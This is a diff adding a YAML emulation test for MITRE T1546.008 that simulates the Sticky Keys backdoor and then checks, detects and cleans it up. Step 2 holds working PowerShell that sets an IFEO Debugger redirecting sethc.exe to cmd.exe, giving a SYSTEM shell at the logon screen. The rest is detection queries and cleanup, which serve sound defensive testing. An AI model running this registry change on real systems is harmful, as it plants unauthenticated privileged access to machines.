@@ -1,0 +1,100 @@
+id: T1546.008_event_triggered_execution_accessibility_features
+name: "Event Triggered Execution — Accessibility Features"
+mitre_technique: "T1546.008"
+mitre_tactic: "persistence"
+description: >
+  Adversaries replace or hijack Windows accessibility feature binaries (sethc.exe,
+  utilman.exe, osk.exe, narrator.exe, magnify.exe) so that pressing the accessibility
+  shortcut keys at the Windows logon screen (Shift×5, Win+U, etc.) launches a
+  backdoor with SYSTEM privileges — before any user logs in. The classic technique
+  replaces sethc.exe with cmd.exe or adds a debugger entry for sethc.exe via IFEO.
+  The IFEO (Image File Execution Options) approach is stealthier as it doesn't modify
+  the original binary.
+author: stanleytobias
+created: "2026-01-01"
+platform: windows
+references:
+  - https://attack.mitre.org/techniques/T1546/008/
+
+steps:
+  - step: 1
+    type: marker
+    description: "Pre-execution context"
+    message: "Starting T1546.008 — Accessibility Features backdoor simulation"
+
+  - step: 2
+    type: exec_powershell
+    description: "Register IFEO debugger for sethc.exe — redirects Sticky Keys to cmd.exe"
+    command: |
+      Write-Host "[PAS] Simulating IFEO accessibility backdoor (sethc.exe -> cmd.exe):"
+      $ifeoPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
+      New-Item -Path $ifeoPath -Force | Out-Null
+      Set-ItemProperty $ifeoPath -Name "Debugger" -Value "$env:SystemRoot\System32\cmd.exe"
+      Write-Host "[PAS] IFEO debugger set: sethc.exe -> cmd.exe"
+      Write-Host "[PAS] Effect: pressing Shift×5 at logon screen opens SYSTEM cmd.exe"
+      Write-Host "[PAS] No binary replacement — harder to detect than file replacement"
+
+  - step: 3
+    type: exec_powershell
+    description: "Check other accessibility binaries for existing IFEO entries"
+    command: |
+      Write-Host "[PAS] Accessibility binary IFEO check:"
+      $accessBinaries = @("sethc.exe","utilman.exe","osk.exe","narrator.exe",
+                          "magnify.exe","displayswitch.exe","atbroker.exe")
+      foreach ($bin in $accessBinaries) {
+          $key = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$bin"
+          if (Test-Path $key) {
+              $dbg = (Get-ItemProperty $key -Name Debugger -ErrorAction SilentlyContinue).Debugger
+              if ($dbg) {
+                  Write-Host "  BACKDOOR DETECTED: $bin -> $dbg"
+              } else {
+                  Write-Host "  IFEO key exists (no debugger): $bin"
+              }
+          }
+      }
+
+  - step: 4
+    type: sleep
+    description: "Allow telemetry to flush"
+    seconds: 3
+
+  - step: 5
+    type: marker
+    description: "Post-execution prompt"
+    message: "Check SIEM — IFEO Debugger value set for sethc.exe, utilman.exe or other accessibility binaries"
+
+cleanup:
+  - step: 1
+    type: exec_powershell
+    description: "Remove IFEO backdoor entries for all accessibility binaries"
+    command: |
+      $accessBinaries = @("sethc.exe","utilman.exe","osk.exe","narrator.exe",
+                          "magnify.exe","displayswitch.exe","atbroker.exe")
+      foreach ($bin in $accessBinaries) {
+          $key = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$bin"
+          if (Test-Path $key) {
+              $dbg = (Get-ItemProperty $key -Name Debugger -ErrorAction SilentlyContinue).Debugger
+              if ($dbg -and $dbg -like "*cmd.exe*" -or $dbg -like "*PAS*") {
+                  Remove-Item $key -Recurse -Force -ErrorAction SilentlyContinue
+                  Write-Host "[PAS][Cleanup] IFEO backdoor removed for: $bin"
+              }
+          }
+      }
+      # Specifically ensure sethc.exe IFEO is clean
+      Remove-Item "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" `
+          -Recurse -Force -ErrorAction SilentlyContinue
+      Write-Host "[PAS][Cleanup] Accessibility IFEO backdoors removed"
+
+  - step: 2
+    type: marker
+    description: "Cleanup complete"
+    message: "T1546.008 cleanup complete"
+
+analyst_checklist:
+  - "Registry event: IFEO Debugger value set for sethc.exe, utilman.exe, or other accessibility binaries"
+  - "File event: sethc.exe, utilman.exe replaced or modified (hash change)"
+  - "Sentinel: DeviceRegistryEvents | where RegistryKey contains 'Image File Execution Options\\\\sethc.exe' and RegistryValueName == 'Debugger'"
+  - "Sentinel: DeviceRegistryEvents | where RegistryKey contains 'Image File Execution Options' and RegistryValueName == 'Debugger' and RegistryKey contains ('sethc','utilman','osk','narrator')"
+  - "MDE alert: 'Accessibility feature backdoor registered'"
+  - "CONTROL CHECK: Audit all IFEO Debugger entries regularly — any entry for accessibility binaries is a backdoor"
+  - "CONTROL CHECK: File Integrity Monitoring on sethc.exe and utilman.exe — hash changes indicate binary replacement"
